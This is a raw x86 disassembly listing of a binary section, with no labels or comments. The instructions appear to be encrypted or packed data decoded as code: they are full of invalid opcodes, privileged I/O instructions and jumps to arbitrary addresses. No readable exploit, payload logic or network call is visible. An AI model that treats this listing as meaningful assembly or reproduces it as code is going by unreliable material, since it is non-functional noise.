  41a91d:	adc    BYTE PTR [esi+0x78],bh
  41a920:	js     0x41a928
  41a922:	jae    0x41a906
  41a924:	data16 jmp 0x41a945
  41a927:	mov    ebx,0x1afbc459
  41a92c:	push   ds
  41a92d:	int    0x7b
  41a92f:	push   ebx
  41a930:	inc    esp
  41a931:	nop
  41a932:	test   esi,edx
  41a934:	add    bh,ch
  41a936:	inc    ebx
  41a937:	mov    bl,BYTE PTR [ebx-0x70b4818c]
  41a93d:	mov    al,0x61
  41a93f:	stos   DWORD PTR es:[edi],eax
  41a940:	push   edx
  41a941:	mov    eax,ds:0x188bde1d
  41a946:	inc    ebx
  41a947:	gs sar cl,0x70
  41a94b:	lods   eax,DWORD PTR ds:[esi]
  41a94c:	test   ah,ch
  41a94e:	dec    edi
  41a94f:	nop
  41a950:	retf   
  41a951:	lahf   
  41a952:	shr    DWORD PTR [esi-0x4f],cl
  41a955:	shl    cl,1
  41a957:	mov    ebx,0x47231278
  41a95c:	mov    ds:0x439d2641,eax
  41a961:	aas    
  41a962:	ds adc al,0x4a
  41a965:	(bad)  
  41a966:	shr    DWORD PTR [esi-0x47],1
  41a969:	jb     0x41a9d2
  41a96b:	scas   al,BYTE PTR es:[edi]
  41a96c:	mov    cl,0xbb
  41a96e:	fsub   QWORD PTR [edi]
  41a970:	inc    esp
  41a971:	pop    es
  41a972:	ja     0x41a9ca
  41a974:	mov    cl,0x4a
  41a976:	sub    esp,eax
  41a978:	or     ebp,eax
  41a97a:	or     BYTE PTR [edi-0x74],al
  41a97d:	cmp    esi,DWORD PTR [ebp+0x2b9d7fa3]
  41a983:	or     al,0x1d
  41a985:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a986:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a987:	xchg   ebx,eax
  41a988:	mov    ebx,cr0
  41a98b:	mov    DWORD PTR [eax],edx
  41a98d:	inc    edi
  41a98e:	in     al,0xff
  41a990:	pop    edx
  41a991:	jle    0x41a9cb
  41a993:	pop    edx
  41a994:	cmp    al,0x90
  41a996:	or     al,0x10
  41a998:	pusha  
  41a999:	sbb    ecx,DWORD PTR [edx-0x7e3dbb44]
  41a99f:	or     DWORD PTR [edi+0x23b455cf],edx
  41a9a5:	xor    eax,0x59ce724f
  41a9aa:	repnz xor BYTE PTR [esi],ah
  41a9ad:	push   edx
  41a9ae:	test   eax,0x194d0660
  41a9b3:	in     eax,0xa3
  41a9b5:	jmp    0x90e7:0x8346ec43
  41a9bc:	cwde   
  41a9bd:	mov    edi,0xa89331a5
  41a9c2:	test   eax,0xe7c1dcb5
  41a9c7:	and    al,0x20
  41a9c9:	push   edx
  41a9ca:	inc    ecx
  41a9cb:	clc    
  41a9cc:	call   0x394cab9e
  41a9d1:	jae    0x41aa51
  41a9d3:	outs   dx,BYTE PTR ds:[esi]
  41a9d4:	dec    ecx
  41a9d5:	pusha  
  41a9d6:	mov    ds:0x9ecf80a5,eax
  41a9db:	call   DWORD PTR [edi-0x23]
  41a9de:	xor    BYTE PTR [eax+0x4e8309f0],al
  41a9e4:	and    ah,BYTE PTR [edi+ecx*2-0x74]
  41a9e8:	mov    bh,0xac
  41a9ea:	adc    cl,BYTE PTR [edi]
  41a9ec:	cmp    dh,BYTE PTR [esi]
  41a9ee:	clc    
  41a9ef:	stc    
  41a9f0:	sub    eax,edi
  41a9f2:	cmc    
  41a9f3:	sub    eax,0x6e25c40f
  41a9f8:	cdq    
  41a9f9:	sbb    ch,BYTE PTR [ecx]
  41a9fb:	(bad)  
  41a9fc:	(bad)  
  41a9fd:	and    eax,0x7e3577c
  41aa02:	sub    dh,BYTE PTR [esi]
  41aa04:	data16 in al,dx
  41aa06:	sbb    DWORD PTR [esi],0x302c9129
  41aa0c:	test   DWORD PTR [ebp+0x46],esp
  41aa0f:	mov    cl,0x79
  41aa11:	out    0x14,eax
  41aa13:	pop    ebx
  41aa14:	test   BYTE PTR [edi-0x3b],bh
  41aa17:	mov    ah,0xd0
  41aa19:	(bad)  
  41aa1a:	cmp    al,0x22
  41aa1c:	das    
  41aa1d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41aa1e:	dec    ebp
  41aa1f:	imul   esi,edi,0xffffff86
  41aa22:	push   edi
  41aa23:	fmul   DWORD PTR [ecx-0x33822220]
  41aa29:	rol    BYTE PTR [ecx+ebp*8],cl
  41aa2c:	in     al,dx
  41aa2d:	pop    edi
  41aa2e:	icebp  
  41aa2f:	call   0x71482ce
  41aa34:	mov    ah,0x75
  41aa36:	dec    ecx
  41aa37:	loop   0x41aa33
  41aa39:	xchg   edi,eax
  41aa3a:	sahf   
  41aa3b:	fistp  DWORD PTR [ecx-0x26]
  41aa3e:	test   BYTE PTR [edi+0x1a],bh
  41aa41:	mov    ds:0xd75bcd79,al
  41aa46:	test   DWORD PTR [ebx+esi*4-0x1b],0x986a53b2
  41aa4e:	sub    eax,0xb88bac5d
  41aa53:	pop    eax
  41aa54:	mov    ds:0x6f69c276,al
  41aa59:	cli    
  41aa5a:	dec    edi
  41aa5b:	fldenv [esi+ebx*4]
  41aa5e:	sahf   
  41aa5f:	jg     0x41aa1f
  41aa61:	and    al,0x2d
  41aa63:	sub    esi,DWORD PTR [esi]
  41aa65:	or     DWORD PTR [ebx-0x1a],esi
  41aa68:	push   0x8adf1190
  41aa6d:	stos   DWORD PTR es:[edi],eax
  41aa6e:	lock scas al,BYTE PTR es:[edi]
  41aa70:	mov    esp,0x899beeb5
  41aa75:	ins    BYTE PTR es:[edi],dx
  41aa76:	cmp    ch,BYTE PTR [esi-0x55]
  41aa79:	pop    edx
  41aa7a:	shr    edi,1
  41aa7c:	sub    bl,BYTE PTR [ebp+0x6ad9b4cc]
  41aa82:	dec    esp
  41aa83:	out    0xd2,eax
  41aa85:	xchg   esp,eax
  41aa86:	fstp   st(4)
  41aa88:	jecxz  0x41aadf
  41aa8a:	mov    ds:0xbd3f8f28,al
  41aa8f:	cs iret 
  41aa91:	jle    0x41ab03
  41aa93:	xchg   DWORD PTR [edx-0x59],esp
  41aa96:	push   edi
  41aa97:	jne    0x41aae4
  41aa99:	fstp   QWORD PTR [ecx]
  41aa9b:	popf   
  41aa9c:	push   0x73
  41aa9e:	xchg   edi,eax
  41aa9f:	inc    esi
  41aaa0:	and    DWORD PTR [esi+edi*4],esi
  41aaa3:	adc    al,0xc0
  41aaa5:	jmp    0x9d467566
  41aaaa:	or     al,0x79
  41aaac:	adc    eax,0x31c053c1
  41aab1:	gs cwde 
  41aab3:	or     al,BYTE PTR [ecx+0x13]
  41aab6:	sahf   
  41aab7:	inc    edx
  41aab8:	addr16 pusha 
  41aaba:	es mov ebx,edx
  41aabd:	repnz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41aabf:	repnz aad 0x57
  41aac2:	or     eax,0xa7d840c0
  41aac7:	cld    
  41aac8:	dec    edi
  41aac9:	test   BYTE PTR [ebp+0x32],bl
  41aacc:	mov    ebp,0xb78ec797
  41aad1:	sub    DWORD PTR [bp+di-0xa],ebp
  41aad5:	adc    DWORD PTR [ecx+0x261032d2],esi
  41aadb:	and    al,0xe6
  41aadd:	jnp    0x41aa5f
  41aadf:	(bad)  
  41aae1:	mov    bl,0xaa
  41aae3:	inc    ebx
  41aae4:	cmp    eax,edx
  41aae6:	xor    dh,BYTE PTR [ecx+0x5dab66ab]
  41aaec:	mov    WORD PTR [edi-0x27217b4f],?
  41aaf2:	inc    eax
  41aaf3:	fdiv   QWORD PTR ds:0xfbcef1f4
  41aaf9:	sti    
  41aafa:	jle    0x41ab67
  41aafc:	std    
  41aafd:	xor    al,BYTE PTR [eax+0x64]
  41ab00:	or     BYTE PTR [esi+0x6c490629],ah
  41ab06:	inc    edi
  41ab07:	sti    
  41ab08:	cdq    
  41ab09:	int    0xbe
  41ab0b:	enter  0x706f,0xd3
  41ab0f:	and    BYTE PTR [eax-0x7382e232],dh
  41ab15:	pop    ds
  41ab16:	inc    eax
  41ab17:	add    BYTE PTR [ebp+0x4ccea9c4],ah
  41ab1d:	or     DWORD PTR [edx+0x5],0xffffffe4
  41ab21:	aaa    
  41ab22:	jno    0x41ab79
  41ab24:	jp     0x41aac0
  41ab26:	outs   dx,BYTE PTR ds:[esi]
  41ab27:	or     BYTE PTR [ebp-0x68134c3d],dh
  41ab2d:	sar    al,cl
  41ab2f:	adc    bh,BYTE PTR [ebp+0x7]
  41ab32:	or     al,0xfa
  41ab34:	pop    esi
  41ab35:	imul   eax,DWORD PTR [esp+edx*1+0x56a594e],0x49
  41ab3d:	pop    ebx
  41ab3e:	jmp    0x41ad73
  41ab43:	rcl    bl,cl
  41ab45:	aas    
  41ab46:	leave  
  41ab47:	cmp    eax,0x48dbdad9
  41ab4c:	pushf  
  41ab4d:	mov    eax,ds:0x8877d4be
  41ab52:	(bad)  
  41ab53:	pusha  
  41ab54:	fstp   TBYTE PTR [edi+0x78]
  41ab57:	adc    BYTE PTR [esi+0x78],bh
  41ab5a:	js     0x41ab70
  41ab5c:	iret   
  41ab5d:	push   es
  41ab5e:	retf   0xa722
  41ab61:	push   esp
  41ab62:	out    dx,eax
  41ab63:	jg     0x41ab6c
  41ab65:	dec    ecx
  41ab66:	imul   edi,DWORD PTR [edx+0x62],0x913b729c
  41ab6d:	pop    ebx
  41ab6e:	test   BYTE PTR [edi+0x5],0x11
  41ab72:	stc    
  41ab73:	iret   
  41ab74:	push   edx
  41ab75:	sahf   
  41ab76:	adc    ecx,DWORD PTR [ebp+0x3b]
  41ab79:	pop    eax
  41ab7a:	(bad)  
  41ab7b:	imul   esp,DWORD PTR [edx-0x28cc0e38],0x6a
  41ab82:	cs adc al,0x67
  41ab85:	lods   al,BYTE PTR ds:[esi]
  41ab86:	sub    dh,BYTE PTR [ecx-0x223f3768]
  41ab8c:	ins    DWORD PTR es:[edi],dx
  41ab8d:	fcomp  DWORD PTR [ebx]
  41ab8f:	ss sti 
  41ab91:	push   cs
  41ab92:	sub    esp,DWORD PTR [edx+0x75d65e4b]
  41ab98:	les    ebp,FWORD PTR es:[esi+0x2]
  41ab9c:	pop    ebp
  41ab9d:	pushf  
  41ab9e:	dec    edx
  41ab9f:	inc    ebp
  41aba0:	jmp    0xc01d6048
  41aba5:	adc    al,0x2
  41aba7:	sub    ch,BYTE PTR [edi+0x6d]
  41abaa:	push   esp
  41abab:	and    DWORD PTR [eax],0xb29f60c6
  41abb1:	mov    ah,0x46
  41abb3:	adc    edx,0x7379abbd
  41abb9:	fisttp QWORD PTR [esi-0x5f]
  41abbc:	outs   dx,BYTE PTR ds:[esi]
  41abbd:	add    al,0x7b
  41abbf:	inc    ebx
  41abc0:	sub    DWORD PTR [edi+0x16b58391],edi
  41abc6:	ficom  WORD PTR [edi-0x71]
  41abc9:	push   esp
  41abca:	pop    ds
  41abcb:	scas   al,BYTE PTR es:[edi]
  41abcc:	mov    esp,0x3ae8c1b5
  41abd1:	dec    ebx
  41abd2:	in     al,0x81
  41abd4:	ror    BYTE PTR [ecx],cl
  41abd6:	mov    ebp,0x40d98bfb
  41abdb:	mov    ecx,0x222cd860
  41abe0:	test   bl,cl
  41abe2:	fst    QWORD PTR [ecx]
  41abe4:	jnp    0x41ac5a
  41abe6:	and    eax,0xd5714bf7
  41abeb:	sbb    eax,0xea7b5f3c
  41abf0:	push   ebx
  41abf1:	push   ebp
  41abf2:	mov    al,0x97
  41abf4:	dec    eax
  41abf5:	xor    ebp,DWORD PTR [ebx-0x2f2cf068]
  41abfb:	sahf   
  41abfc:	retf   0xea61
  41abff:	jo     0x41ac20
  41ac01:	dec    ecx
  41ac02:	sbb    ax,0x48ad
  41ac06:	out    0xc4,eax
  41ac08:	cmc    
  41ac09:	(bad)  
  41ac0a:	and    bh,BYTE PTR [ebp+0x52]
  41ac0d:	into   
  41ac0e:	fsub   DWORD PTR [edx]
  41ac10:	adc    eax,0x54439748
  41ac15:	lds    ecx,FWORD PTR [edx-0x1f]
  41ac18:	mov    al,0xb2
  41ac1a:	aas    
  41ac1b:	cmp    DWORD PTR [edi-0x2aa30e9e],edx
  41ac21:	sub    BYTE PTR [edx+0xb06b431],bl
  41ac27:	aam    0x45
  41ac29:	xor    eax,0x54c76fdd
  41ac2e:	lea    ecx,[ebx+eax*4]
  41ac31:	mov    ebx,0x456253bc
  41ac36:	jne    0x41abd4
  41ac38:	int3   
  41ac39:	lods   eax,DWORD PTR ds:[esi]
  41ac3a:	adc    eax,esp
  41ac3c:	popf   
  41ac3d:	shr    edx,cl
  41ac3f:	cmc    
  41ac40:	outs   dx,BYTE PTR ds:[esi]
  41ac41:	pop    ss
  41ac42:	or     DWORD PTR [ebx+0x52e2776c],esi
  41ac48:	cmp    BYTE PTR [eax+ecx*8],ah
  41ac4b:	pop    es
  41ac4c:	push   cs
  41ac4d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ac4e:	adc    ebx,DWORD PTR [ebp+0x639f2114]
  41ac54:	rcr    DWORD PTR [ebx+0x1038752f],1
  41ac5a:	jnp    0x41ac78
  41ac5c:	fisubr WORD PTR [eax-0x3bf8d7f0]
  41ac62:	jnp    0x41ac42
  41ac64:	int    0xdf
  41ac66:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ac67:	add    al,0xa4
  41ac69:	icebp  
  41ac6a:	ins    BYTE PTR es:[edi],dx
  41ac6b:	mov    ds:0x693a86e6,al
  41ac70:	and    ebx,esi
  41ac72:	aam    0xa0
  41ac74:	mov    eax,0xf17d39ae
  41ac79:	repnz pop es
  41ac7b:	lods   eax,DWORD PTR ds:[esi]
  41ac7c:	ja     0x41ac26
  41ac7e:	cwde   
  41ac7f:	xchg   edi,eax
  41ac80:	mov    BYTE PTR [ebp-0x7db53b99],bl
  41ac86:	sahf   
  41ac87:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ac88:	fidiv  WORD PTR [edx+0x701c2a7d]
  41ac8e:	jl     0x41ac4d
  41ac90:	in     al,dx
  41ac91:	push   edi
  41ac92:	and    al,0xfd
  41ac94:	push   ss
  41ac95:	inc    ebp
  41ac96:	mov    ecx,0x4068fdf3
  41ac9b:	xchg   ebx,ebp
  41ac9d:	jmp    0x41acb1
  41ac9f:	js     0x41ad1b
  41aca1:	lock dec ebp
  41aca3:	(bad)
  41aca7:	xlat   BYTE PTR ds:[ebx]
  41aca8:	pop    eax
  41aca9:	cmp    al,0x5e
  41acab:	xlat   BYTE PTR ds:[ebx]
  41acac:	repz aam 0xd
  41acaf:	mov    cl,BYTE PTR [esi]
  41acb1:	xor    al,0x69
  41acb3:	adc    cl,cl
  41acb5:	mov    ebx,0x90be9dab
  41acba:	mov    ecx,0x293c705f
  41acbf:	inc    ebp
  41acc0:	stc    
  41acc1:	mov    ds:0x57c65782,al
  41acc7:	xchg   ecx,eax
  41acc8:	adc    DWORD PTR [ebx],edi
  41acca:	ret    
  41accb:	adc    bh,BYTE PTR [edi]
  41accd:	xchg   ecx,eax
  41acce:	push   esi
  41accf:	push   esi
  41acd0:	(bad)
  41acd4:	imul   edx,DWORD PTR [edi+0x3f914aea],0xffffffe2
  41acdb:	rol    DWORD PTR [esi-0x27808d65],0x5a
  41ace2:	ret    
  41ace3:	mov    dh,0x26
  41ace5:	mov    ch,0x24
  41ace7:	outs   dx,DWORD PTR ds:[esi]
  41ace8:	in     al,dx
  41ace9:	dec    esi
  41acea:	add    DWORD PTR [esi],esp
  41acec:	push   ss
  41aced:	mov    esi,0xe208ca83
  41acf2:	lock out 0x30,eax
  41acf5:	mov    BYTE PTR [edi-0x4e5d0e25],dl
  41acfb:	push   0x522eec43
  41ad00:	cmp    BYTE PTR [ebp+0x68824cd1],al
  41ad06:	pop    ss
  41ad07:	inc    esp
  41ad08:	jns    0x41acfc
  41ad0a:	and    edi,ebp
  41ad0c:	jecxz  0x41acc8
  41ad0e:	xor    DWORD PTR [ebp-0x6],ecx
  41ad11:	js     0x41ad1e
  41ad13:	sbb    al,0x16
  41ad15:	cld    
  41ad16:	and    ebp,edx
  41ad18:	adc    BYTE PTR [ebp+0x45],al
  41ad1b:	imul   edi,DWORD PTR [eax+edx*8],0xffffffc3
  41ad1f:	(bad)  
  41ad20:	cmp    DWORD PTR [esi-0x28],ecx
  41ad23:	rol    DWORD PTR ds:[ebx+0x4702cc84],0x62
  41ad2b:	scas   eax,DWORD PTR es:[edi]
  41ad2c:	jmp    0x41ad3c
  41ad2e:	je     0x41ad62
  41ad30:	daa    
  41ad31:	daa    
  41ad32:	outs   dx,BYTE PTR ds:[esi]
  41ad33:	test   eax,0xad31056a
  41ad38:	or     al,0x3c
  41ad3a:	mov    bh,0x87
  41ad3c:	icebp  
  41ad3d:	jge    0x41ad4d
  41ad3f:	les    eax,FWORD PTR [edx]
  41ad41:	fs scas eax,DWORD PTR es:[edi]
  41ad43:	cmp    DWORD PTR [esi-0x29763ce4],edx
  41ad49:	jmp    0x37af:0x12ae00cd
  41ad50:	adc    eax,0xb3c52574
  41ad55:	loop   0x41ad38
  41ad57:	push   es
  41ad58:	pusha  
  41ad59:	ds or  al,0xd6
  41ad5c:	and    bl,bh
  41ad5e:	call   0xcedb7c
  41ad63:	cmc    
  41ad64:	pop    ebx
  41ad65:	dec    ebp
  41ad66:	pop    ebx
  41ad67:	mov    BYTE PTR [ecx-0x2b],dl
  41ad6a:	xlat   BYTE PTR ds:[ebx]
  41ad6b:	nop
  41ad6c:	lods   eax,DWORD PTR ds:[esi]
  41ad6d:	jbe    0x41add3
  41ad6f:	pop    edx
  41ad70:	fsub   st(7),st
  41ad72:	sbb    DWORD PTR [edi-0x1626d435],eax
  41ad78:	xor    BYTE PTR [edx],al
  41ad7a:	add    BYTE PTR [eax],al
  41ad7c:	ret    0xd1d7
  41ad7f:	aas    
  41ad80:	fxch   st(1)
  41ad82:	rcr    cl,cl
  41ad84:	mov    ds:0xc9d25295,eax
  41ad89:	cmp    eax,0xd8788670
  41ad8e:	jg     0x41ae08
  41ad90:	adc    BYTE PTR [esi+0x78],bh
  41ad93:	js     0x41add8
  41ad95:	mov    ds:0x7f28489f,al
  41ad9a:	dec    ecx
  41ad9b:	scas   al,BYTE PTR es:[edi]
  41ad9c:	mov    cs,WORD PTR [ecx]
  41ad9e:	mov    dh,0x2f
  41ada0:	mov    ch,0x36
  41ada2:	cmp    BYTE PTR [ebx],ch
  41ada4:	test   BYTE PTR [edx-0x187f571b],ah
  41adaa:	aam    0x5f
  41adac:	shr    BYTE PTR ds:0xbbf580a9,cl
  41adb2:	lds    esp,FWORD PTR gs:[edi+0x43]
  41adb6:	jle    0x41ad90
  41adb8:	pop    esp
  41adb9:	out    0x1c,al
  41adbb:	mov    esi,0x5fa70783
  41adc0:	push   cs
  41adc1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41adc2:	icebp  
  41adc3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41adc4:	cmp    DWORD PTR [ecx-0x6723d700],edx
  41adca:	push   ss
  41adcb:	stos   DWORD PTR es:[edi],eax
  41adcc:	dec    edi
  41adcd:	out    0x2a,eax
  41adcf:	or     dl,bh
  41add1:	mov    ds:0xea09efb9,al
  41add6:	dec    edx
  41add7:	pop    esi
  41add8:	(bad)  
  41add9:	fcmove st,st(7)
  41addb:	sbb    al,0x52
  41addd:	pop    esi
  41adde:	fdivr  st,st(3)
  41ade0:	es add ebp,ecx
  41ade3:	mov    esi,0xd6d8b791
  41ade8:	(bad)  
  41ade9:	aam    0xe9
  41adeb:	cmp    cl,BYTE PTR [ecx+eax*8]
  41adee:	in     eax,0x31
  41adf0:	sahf   
  41adf1:	jmp    0x9ee4f451
  41adf6:	(bad)  
  41adf7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41adf8:	jge    0x41ad89
  41adfa:	loopne 0x41ae6d
  41adfc:	push   esp
  41adfd:	aad    0xc9
  41adff:	cmp    eax,DWORD PTR [eax]
  41ae01:	jmp    0x41ada4
  41ae03:	xchg   edx,eax
  41ae04:	ret    
  41ae05:	popf   
  41ae06:	jp     0x41add8
  41ae08:	sbb    edi,DWORD PTR [edx]
  41ae0a:	xor    al,0x1
  41ae0c:	mov    ah,0x3c
  41ae0e:	xchg   BYTE PTR [ecx],ch
  41ae10:	int    0xd4
  41ae12:	outs   dx,DWORD PTR ds:[esi]
  41ae13:	add    DWORD PTR [eax-0x5b43ff6e],ebp
  41ae19:	dec    eax
  41ae1a:	adc    bh,BYTE PTR [esp+eiz*8-0x36]
  41ae1e:	mov    edi,0x928f92ff
  41ae23:	lods   al,BYTE PTR ds:[esi]
  41ae24:	stos   BYTE PTR es:[edi],al
  41ae25:	xchg   esi,eax
  41ae26:	(bad)  
  41ae27:	shl    DWORD PTR [edi+0x57],0x55
  41ae2b:	sahf   
  41ae2c:	or     eax,0xa8ea11ec
  41ae31:	pop    ds
  41ae32:	sbb    dh,BYTE PTR [eax-0x3143f743]
  41ae38:	(bad)  
  41ae39:	xor    DWORD PTR [ebx-0x1b60463f],edi
  41ae3f:	or     eax,0x3fc34efc
  41ae44:	hlt    
  41ae45:	inc    esi
  41ae46:	fcom   DWORD PTR [ecx-0x3ade3cf3]
  41ae4c:	jg     0x41ae29
  41ae4e:	shl    BYTE PTR [edi-0x3f2b0018],1
  41ae54:	ror    ecx,0xf6
  41ae57:	test   edx,esi
  41ae59:	inc    esi
  41ae5a:	es push ecx
  41ae5c:	mov    esi,0x88d619b0
  41ae61:	fwait
  41ae62:	imul   esp,ebx,0xa372956f
  41ae68:	mov    al,0xe9
  41ae6a:	cs mov dh,0xf
  41ae6d:	cmp    ah,0xe7
  41ae70:	mov    ecx,0x53d604d2
  41ae75:	popa   
  41ae76:	inc    ecx
  41ae77:	xchg   esi,eax
  41ae78:	adc    ebx,esi
  41ae7a:	jg     0x41ae6c
  41ae7c:	pop    esi
  41ae7d:	imul   ecx,eax,0x404bae63
  41ae83:	xchg   edx,eax
  41ae84:	jecxz  0x41aeea
  41ae86:	repz dec esp
  41ae88:	jge    0x41ae33
  41ae8a:	int    0xa7
  41ae8c:	addr16 sub al,0xf5
  41ae8f:	xchg   esp,eax
  41ae90:	add    BYTE PTR [ebx+ebx*8+0x44],dh
  41ae94:	push   edi
  41ae95:	xlat   BYTE PTR ds:[ebx]
  41ae96:	xchg   edx,eax
  41ae97:	push   0x4
  41ae99:	arpl   WORD PTR [edx],sp
  41ae9b:	xlat   BYTE PTR ds:[ebx]
  41ae9c:	in     al,0x63
  41ae9e:	sub    eax,0x18f94e27
  41aea3:	xor    DWORD PTR [edx+0x459f1b05],edi
  41aea9:	mov    WORD PTR [edi],?
  41aeab:	xchg   esp,eax
  41aeac:	imul   ebp,DWORD PTR [ecx-0x660caa8c],0xffffffc1
  41aeb3:	mov    ebx,DWORD PTR [ebp+0x2b83b71]
  41aeb9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41aeba:	retf   0x79d3
  41aebd:	cwde   
  41aebe:	inc    eax
  41aebf:	adc    DWORD PTR [ebx],eax
  41aec1:	hlt    
  41aec2:	lahf   
  41aec3:	push   ebx
  41aec4:	sbb    bh,BYTE PTR [eax+0x64e9711b]
  41aeca:	inc    edx
  41aecb:	lds    esp,FWORD PTR [ecx+0x50ecb5ac]
  41aed1:	add    ebp,DWORD PTR [eax-0x43]
  41aed4:	add    eax,0xf7608167
  41aed9:	mov    eax,0xdb9b369a
  41aede:	(bad)  
  41aedf:	aad    0x92
  41aee1:	mov    cl,0x37
  41aee3:	and    DWORD PTR [ecx],eax
  41aee5:	lods   eax,DWORD PTR ds:[esi]
  41aee6:	je     0x41aeac
  41aee8:	popa   
  41aee9:	push   es
  41aeea:	pop    eax
  41aeeb:	ins    BYTE PTR es:[edi],dx
  41aeec:	pop    ds
  41aeed:	jg     0x41ae92
  41aeef:	pop    ds
  41aef0:	pop    esp
  41aef1:	inc    esp
  41aef2:	xchg   edi,eax
  41aef3:	lods   eax,DWORD PTR ds:[esi]
  41aef4:	aam    0x7b
  41aef6:	pop    eax
  41aef7:	inc    esp
  41aef8:	sub    DWORD PTR [edx+0x68],ebp
  41aefb:	test   DWORD PTR [edx-0x3e27b68d],0xd6261d6
  41af05:	sub    BYTE PTR [ecx],dh
  41af07:	out    0x1,al
  41af09:	clc    
  41af0a:	add    DWORD PTR [edx+0xb6d4023],edx
  41af10:	xor    eax,0x98f62820
  41af15:	(bad)  
  41af16:	dec    ebx
  41af17:	inc    eax
  41af18:	hlt    
  41af19:	xchg   BYTE PTR [edx+eax*4+0x6efd257c],bh
  41af20:	popf   
  41af21:	adc    bh,ch
  41af23:	push   ebx
  41af24:	xor    dl,ch
  41af26:	jg     0x41af19
  41af28:	mov    ds:0x683a4257,eax
  41af2d:	mov    al,ds:0x99d826d2
  41af32:	call   0x4deb:0xd977f7b3
  41af39:	fadd   st,st(6)
  41af3b:	mov    esi,0x2f874671
  41af40:	push   eax
  41af41:	icebp  
  41af42:	dec    ebx
  41af43:	sub    esp,edx
  41af45:	dec    edx
  41af46:	push   edi
  41af47:	sti    
  41af48:	xor    bl,BYTE PTR [eax-0x625eeca4]
  41af4e:	pop    ebp
  41af4f:	fucom  st(1)
  41af51:	mov    al,0x70
  41af53:	lds    eax,FWORD PTR [eax]
  41af55:	jmp    0x7b94:0x9b99430c
  41af5c:	mov    esi,0x9e031847
  41af61:	rcl    DWORD PTR [edi+0x19dbccc5],cl
  41af67:	mov    cl,0xe3
  41af69:	popf   
  41af6a:	repz inc dh
  41af6d:	mov    dh,0x86
  41af6f:	js     0x41afa2
  41af71:	js     0x41af18
  41af73:	sub    BYTE PTR [edx+ebx*2-0x4],cl
  41af77:	shl    BYTE PTR [ecx-0x57affcb9],0xc7
  41af7e:	idiv   DWORD PTR [edi]
  41af80:	adc    al,BYTE PTR [ebx+0x4b3ed30]
  41af86:	dec    ecx
  41af87:	sahf   
  41af88:	cmp    esi,DWORD PTR [esp+edi*8-0x2d3b0984]
  41af8f:	or     DWORD PTR [ecx+0x51d494f8],edi
  41af95:	or     eax,0x3195191c
  41af9a:	xor    bh,BYTE PTR [ecx-0x147d6917]
  41afa0:	fmul   DWORD PTR [esi]
  41afa2:	adc    eax,0xafb1859b
  41afa7:	fimul  WORD PTR ss:[eax-0x4d]
  41afab:	fadd   QWORD PTR [edi+0x230e9cb]
  41afb1:	add    BYTE PTR [eax],al
  41afb3:	(bad)
  41afb6:	int    0xd4
  41afb8:	int    0xd9
  41afba:	fnstcw WORD PTR [edi+0x61181003]
  41afc0:	lea    eax,[eax+0x7fde10d2]
  41afc6:	js     0x41afd8
  41afc8:	jle    0x41b042
  41afca:	js     0x41afcb
  41afcc:	pop    ebx
  41afcd:	mov    ch,0xba
  41afcf:	push   ebp
  41afd0:	fwait
  41afd1:	xor    BYTE PTR [esi+0x61730947],dl
  41afd7:	inc    esi
  41afd8:	iret   
  41afd9:	sub    ah,BYTE PTR [ebp+0x85164fe]
  41afdf:	dec    ecx
  41afe0:	in     al,0x7f
  41afe2:	fisubr DWORD PTR [ebx+0x2274285c]
  41afe8:	stc    
  41afe9:	and    BYTE PTR [edx],0x3f
  41afec:	jl     0x41afb5
  41afee:	inc    esp
  41afef:	jle    0x41afda
  41aff1:	je     0x41b043
  41aff3:	(bad)  
  41aff4:	xlat   BYTE PTR ds:[ebx]
  41aff5:	pop    ebp
  41aff6:	mov    ebx,esi
  41aff8:	xchg   ebx,eax
  41aff9:	inc    edx
  41affa:	outs   dx,DWORD PTR ds:[esi]
  41affb:	mov    esi,0xce1ab8e8
  41b000:	aad    0x2c
  41b002:	and    DWORD PTR [esi],ebx
  41b004:	sub    dh,ch
  41b006:	aad    0xb8
  41b008:	mov    ?,WORD PTR [ecx-0x5ee5a1be]
  41b00e:	add    DWORD PTR [ecx+0x7a5a36df],ecx
  41b014:	ret    
  41b015:	in     eax,dx
  41b016:	pop    ss
  41b017:	aaa    
  41b018:	(bad)  [ebp+0x23]
  41b01b:	cli    
  41b01c:	pop    ss
  41b01d:	inc    esi
  41b01e:	out    dx,al
  41b01f:	test   al,0x27
  41b021:	clc    
  41b022:	pop    gs
  41b024:	lea    ecx,[ecx-0x75]
  41b027:	cli    
  41b028:	(bad)  
  41b029:	(bad)  
  41b02a:	stos   DWORD PTR es:[edi],eax
  41b02b:	(bad)  
  41b02c:	push   esi
  41b02d:	(bad)  
  41b02e:	lods   al,BYTE PTR ds:[esi]
  41b02f:	inc    edx
  41b030:	lods   al,BYTE PTR ds:[esi]
  41b031:	cs mov ah,0xe5
  41b034:	jge    0x41b040
  41b036:	mov    WORD PTR [ecx],cs
  41b038:	fstp   QWORD PTR [esi]
  41b03a:	lahf   
  41b03b:	xchg   ebp,eax
  41b03c:	jecxz  0x41b077
  41b03e:	cdq    
  41b03f:	ret    
  41b040:	mov    BYTE PTR [ecx-0x73],dh
  41b043:	ret    
  41b044:	shr    DWORD PTR [edx+ebp*8],cl
  41b047:	enter  0x5345,0x5b
  41b04b:	lock mov DWORD PTR [esp+ecx*1],0x93b3c44
  41b053:	bound  ebx,QWORD PTR [edx+0x1]
  41b056:	jbe    0x41b018
  41b058:	push   ss
  41b059:	mov    eax,ds:0xd052b20d
  41b05e:	add    BYTE PTR [esi+eiz*1],ch
  41b061:	cmp    bh,BYTE PTR [edi]
  41b063:	add    BYTE PTR [ecx-0x62],bh
  41b066:	jge    0x41b057
  41b068:	jp     0x41b0bd
  41b06a:	sub    eax,edi
  41b06c:	or     esp,DWORD PTR [ebx-0x48]
  41b06f:	dec    edi
  41b070:	push   esp
  41b071:	inc    ecx
  41b072:	ja     0x41b0a2
  41b074:	out    0x68,al
  41b076:	stos   DWORD PTR es:[edi],eax
  41b077:	mov    esi,0x4c8e2e36
